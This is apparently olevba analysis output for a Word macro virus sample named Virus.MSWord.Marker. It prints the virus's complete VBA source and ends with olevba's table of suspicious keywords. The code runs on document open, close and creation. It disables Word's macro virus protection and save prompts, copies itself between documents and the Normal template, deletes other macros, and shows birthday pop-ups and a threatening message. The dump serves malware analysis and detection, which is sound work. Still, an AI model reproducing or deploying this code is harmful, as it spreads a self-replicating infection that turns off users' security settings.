olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.kl-05033ede0010cecdb1f323fece15b7d7aa6a3334
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.kl-05033ede0010cecdb1f323fece15b7d7aa6a3334 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Dim x1, x2, x3, x4 As Boolean
Dim x5, x6 As Object
Dim x7, x8, x16 As Integer
Dim x9 As Date
Dim x10, x11, x12, x13, x14 As String
Const x15 = ":-D you are marked!"
Private Sub Document_Close()
On Error Resume Next
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.codemodule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.codemodule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    Application.Caption = "Happy Birthday rajesh- 1st Sept.The World may Forget but not me"
    x10 = MsgBox("Did You Wish rajesh on his Birthday ?", vbYesNo)
    If x10 = vbYes Then
        MsgBox "Thank You! I Love You. You are wonderfull."
    Else
        MsgBox " You are Heart Less." & vbCrLf & "You Will Be Punished For This", vbCritical
    End If
End If
If x3 = True Then
    x13 = x5.codemodule.Lines(1, x5.codemodule.countoflines)
ElseIf x4 = True Then
    x13 = x6.codemodule.Lines(1, x6.codemodule.countoflines)
End If

'If (x3 = True Xor x4 = True) And _
 '  (ActiveDocument.SaveFormat = wdFormatDocument Or _
  ' ActiveDocument.SaveFormat = wdFormatTemplate) Then

      If x3 = True Then
        x2 = NormalTemplate.Saved
        x11 = x5.codemodule.Lines(1, x5.codemodule.countoflines)
        x6.codemodule.DeleteLines 1, x6.codemodule.countoflines
        x6.codemodule.AddFromString x11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "rajesh's Birthday falls on 1th Sept.  Don't Forget to wish him": .Execute: End With
        If x2 = True Then NormalTemplate.Save
      End If
    If x4 = True Or ActiveDocument.Saved = False Then
     x1 = ActiveDocument.Saved
     x11 = x6.codemodule.Lines(1, x6.codemodule.countoflines)
     x5.codemodule.DeleteLines 1, x5.codemodule.countoflines
     x5.codemodule.AddFromString x11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "Are You suprised ?": .Subject = "Birthday ": .Author = "LSK": .Category = "You Are Infected": .Keywords = "Birthday": .Comments = "rajesh's Birthday falls on 1th Sept.  Don't Forget to wish him": .Execute: End With
     If x1 = True Then ActiveDocument.Save
   End If
  
    
'End If

End Sub

Private Sub Document_New()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.codemodule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.codemodule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.codemodule.DeleteLines 1, x6.codemodule.countoflines
    MsgBox x6.codemodule.countoflines
End If
If x3 = False Then
        x5.codemodule.DeleteLines 1, x5.codemodule.countoflines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
'If x7 >= 23 And x8 = 7 Then
With Selection.Font: x16 = .Size: .Size = 72: .ColorIndex = wdGreen: .Animation = wdAnimationSparkleText: Selection.InsertAfter "Meet Rajesh In 26": Selection.MoveDown Unit:=wdScreen, Count:=2: .Size = x16: .ColorIndex = wdAuto: .Animation = wdAnimationNone: End With

'End If
End Sub

Private Sub Document_Open()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.codemodule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.codemodule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.codemodule.DeleteLines 1, x6.codemodule.countoflines
End If
If x3 = False Then
    x5.codemodule.DeleteLines 1, x5.codemodule.countoflines
End If

x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
If x7 >= 23 And x8 = 7 Then
    x10 = MsgBox("Did You Wish rajesh on his Birthday ?", vbYesNo)
End If
End Sub













































































































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

